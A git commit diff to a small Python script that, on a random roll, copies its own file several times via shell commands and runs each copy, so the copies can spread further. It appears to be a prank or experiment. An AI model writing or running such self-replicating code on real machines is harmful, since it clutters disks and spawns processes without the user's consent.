d544f11c6ac9c8f57ca968b2dbc03b5b9153564e
zakaria-amghare <zizou.amgh@gmail.com>
2025-10-14 21:01:30 +0100

    m

--- exscute.py
+++ exscute.py
@@ -1,11 +1,14 @@
 import os
 import random
 file=os.path.basename(__file__)
-x = random(1,10)
-if x == 1:
+x = random.randint(1,10)
+if x == 5:
     print("you ar unlucky")
     print("what a miss")
-    for i in range(10):
+    for i in range(4):
         os.system(f"copy {file} {i}{file}")
         os.system(f"python ./{i}{file}")
         os.system(f"python {i}{file}")
+else:
+
+    print("lucku you",x)
